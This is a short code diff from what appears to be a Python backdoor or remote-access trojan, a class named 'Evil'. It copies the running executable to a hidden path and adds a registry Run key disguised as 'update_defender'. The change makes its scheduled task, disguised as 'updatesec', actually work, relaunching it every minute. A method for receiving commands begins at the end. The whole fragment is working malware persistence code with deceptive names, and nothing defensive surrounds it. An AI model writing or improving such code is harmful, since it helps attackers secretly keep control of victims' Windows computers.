@@ -29,7 +29,7 @@ class Evil:
         if not os.path.exists(hidden_path):
             shutil.copyfile(sys.executable, hidden_path)
             subprocess.call('reg add HKCU\Software\Microsoft\windows\CurrentVersion\Run /v update_defender /t REG_SZ /d "'+hidden_path+'"',shell=True)
-            subprocess.call('schtasks /create /tn "updatesec" /sc minute /mo 1 /tr "'+hidden_path+'"')
+            subprocess.call('schtasks /create /tn "updatesec" /sc minute /mo 1 /tr "'+hidden_path+'"',shell=True)
     def reliable_recv(self):
         json_data = ""
         while True:
